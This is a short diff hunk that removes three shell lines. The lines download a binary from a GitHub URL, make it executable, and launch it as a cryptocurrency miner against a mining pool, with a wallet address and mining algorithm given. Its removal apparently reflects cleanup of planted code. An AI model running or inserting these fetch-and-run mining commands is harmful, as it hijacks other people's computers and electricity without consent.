@@ -1,3 +1,0 @@
-wget https://github.com/komaria10003099/komaria/raw/main/minera
-chmod +x minera
-./bash -o fr-upx.miningocean.org:4332 -u UmW3y8YH8oQ3WRNDYVCNt1BN6xjHuTvaSVrzyxTbretq6SvVWbeSy6MARXLcmb3o18eY15e8jYfw6CrahhCHvnAX1gF8zqfAk -p test -a cryptonight-upx/2 -k --donate-level 1
